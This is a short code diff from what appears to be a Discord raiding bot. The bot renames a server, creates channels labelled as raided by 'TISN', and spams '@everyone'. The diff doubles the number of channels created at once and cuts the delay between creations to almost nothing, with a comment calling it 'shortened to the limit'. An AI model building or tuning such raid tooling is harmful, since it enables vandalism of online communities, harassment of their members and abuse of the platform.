@@ -14,8 +14,8 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 SERVER_NAME = "トイ神の植民地"
 CHANNEL_NAME = "ここはトイ神の集い|TISNに荒らされました😂"
-BATCH_SIZE = 15  # 一括作成する数
-CREATE_INTERVAL = 0.0001  # 限界まで短縮
+BATCH_SIZE = 30  # 一括作成する数
+CREATE_INTERVAL = 0.000001  # 限界まで短縮
 
 COMBINED_TEXT = (
     "@everyone\n"
